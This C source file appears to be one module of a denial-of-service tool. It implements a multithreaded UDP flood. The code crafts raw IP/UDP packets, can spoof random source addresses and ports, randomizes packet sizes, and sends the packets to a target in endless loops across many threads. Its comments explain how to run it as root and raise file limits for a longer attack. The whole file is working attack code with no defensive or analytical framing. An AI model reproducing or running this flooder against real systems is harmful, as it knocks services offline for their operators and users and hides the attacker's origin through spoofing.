#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <pthread.h>
#include <stdarg.h>
#include <string.h> // memcpy

#include <unistd.h>
#include <netinet/ip.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/udp.h>
#include <arpa/inet.h>

#include "../main.h"

extern void info(const char *fmt, ...);
extern void warning(const char *fmt, ...);
extern void error(const char *fmt, ...);

extern char *randip(char **buff);
extern int randport(void);
extern unsigned short checksum(unsigned short *ptr, int hlen, char *data); 

static int _send_udp_packet(const char *daddr, const int dport, const char *saddr, const int sport, const int rep, const int dp)
{

    // for UDP padding size
    // make sure the size is very small
    // same traffic will send more packets that make the target busy
    int padding_size = PADDING_SIZE;
    if (dp)
        // dynamic packet size enable
        // get the random number from [1, 8]
        // The number of bytes is a multiple of 4
        // limited: MTU = 1500
        padding_size = (2 << (1 + randport() % 4));

    int socket_fd;
    socket_fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (socket_fd < 0)
    {
        /*
        * if errno == 1
        *   This program should run as root user
        * if errno == 24
        *   You shoud check max file number use 'ulimit -n' in linux
        *   And change the max file number use 'ulimit -n <setting number>'
        *   Or you can change the EACH_IP_REPEAT_TIME value to delay the attack end time
        */
        error(strerror(errno));
    }

    int size = sizeof(struct ip) + sizeof(struct udphdr) + padding_size;
    char *datagram = (char *)malloc(sizeof(char) * size);

    struct ip *iph = (struct ip *)datagram;
    struct udphdr *udph = (struct udphdr *)(datagram + sizeof(struct ip));

    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(dport);
    sin.sin_addr.s_addr = inet_addr(daddr);

    // ip header
    iph->ip_v = 4;
    iph->ip_hl = 5;
    iph->ip_tos = 0;
    iph->ip_len = sizeof(struct ip) + sizeof(struct udphdr) + padding_size;
    iph->ip_id = htons(randport());
    iph->ip_off = 0;
    iph->ip_ttl = 255;
    iph->ip_p = IPPROTO_UDP;
    iph->ip_sum = 0; // a remplir aprés
    iph->ip_src.s_addr = inet_addr(saddr);
    iph->ip_dst.s_addr = inet_addr(daddr);
    iph->ip_sum = htons(checksum((unsigned short *)datagram, sizeof(struct ip), NULL));

    // udp header
    udph->uh_sport = htons(sport);
    udph->uh_dport = htons(dport);
    udph->uh_ulen = htons(sizeof(struct udphdr) + padding_size);
    udph->uh_sum = 0;

    char *data = (char *)(datagram + sizeof(struct ip) + sizeof(struct udphdr));
    // filed the data
    int n = (padding_size >> 2);
    int i;
    for (i = 0; i < n; i++)
    {
        memcpy(data + i + 0, "l", 1);
        memcpy(data + i + 1, "o", 1);
        memcpy(data + i + 2, "v", 1);
        memcpy(data + i + 3, "e", 1);
    }

    struct pseudo_header_udp *psh = (struct pseudo_header_udp *)malloc(sizeof(struct pseudo_header_udp));
    psh->source_address = inet_addr(saddr);
    psh->dest_address = sin.sin_addr.s_addr;
    psh->placeholder = 0;
    psh->protocol = IPPROTO_UDP;
    psh->udp_length = htons(size);
    memcpy(&psh->udph, udph, sizeof(struct udphdr));
    udph->uh_sum = htons(checksum((unsigned short *)psh, sizeof(struct pseudo_header_udp), data));
    free(psh);

    int one = 1;
    const int *val = &one;
    if (setsockopt(socket_fd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
    {
        error(strerror(errno));
    }

    // envoi
    for (int i = 0; i < rep; i++)
    {
        if (sendto(socket_fd, datagram, size, 0, (struct sockaddr *)&sin, sizeof(struct sockaddr)) < 0)
        {
            error(strerror(errno));
        }
    }

    close(socket_fd);
    free(datagram);
    return 0;
}

static void _attack_thread(pUFTP parameters)
{
    char *daddr = parameters->daddr;
    char *saddr = parameters->saddr;
    int rep = parameters->rep;
    int dp = parameters->dp;
    int sport = parameters->sport;
    int dport = parameters->dport;

    if (parameters->random_saddr)
    {
        saddr = (char *)malloc(sizeof(char) * MAX_IP_LENGTH);
        while (1)
        {
            if (parameters->ddp)
                dport = randport();
            saddr = randip(&saddr);
            sport = randport();
            _send_udp_packet(daddr, dport, saddr, sport, rep, dp);
        }
    }
    else
    {
        while (1)
        {
            if (parameters->ddp)
                dport = randport();
            _send_udp_packet(daddr, dport, saddr, sport, rep, dp);
        }
    }
}

int udp_flood_attack(char *url, int port, ...)
{

    int slist[4] = {'\0'};
    int i;

    va_list vlist;
    va_start(vlist, port);
    for (i = 0; i < 3; i++)
    {
        slist[i] = va_arg(vlist, int);
    }
    int random_saddr = slist[0];
    int rep = slist[1];
    int thread_number = slist[2];
    char *saddr = va_arg(vlist, char *);
    int sport = va_arg(vlist, int);
    int dp = va_arg(vlist, int);
    int ddp = va_arg(vlist, int);
    va_end(vlist);

    pUFTP parameters = (pUFTP)malloc(sizeof(UFTP));
    parameters->daddr = url;
    parameters->dport = port;
    parameters->saddr = saddr;
    parameters->sport = sport;
    parameters->rep = rep;
    parameters->random_saddr = random_saddr;
    parameters->dp = dp;
    parameters->ddp = ddp;

    pthread_t tid_list[thread_number];
    pthread_attr_t attr;
    int ret;
    // only one process
    for (i = 0; i < thread_number; i++)
    {
        //input->serial_num = (i * input->max_thread) + j;
        if (pthread_attr_init(&attr))
        {
            error(strerror(errno));
        }
        // if (pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED))
        if (pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_JOINABLE))
        {
            error(strerror(errno));
        }
        // create thread
        ret = pthread_create(&tid_list[i], &attr, (void *)_attack_thread, parameters);
        if (ret != 0)
        {
            error("create pthread failed, ret: %d, %s", ret, strerror(errno));
            return 1;
        }
        pthread_attr_destroy(&attr);
    }
    // pthread_detach(tid);
    // join them all
    for (i = 0; i < thread_number; i++)
    {
        pthread_join(tid_list[i], NULL);
    }
    return 0;
}
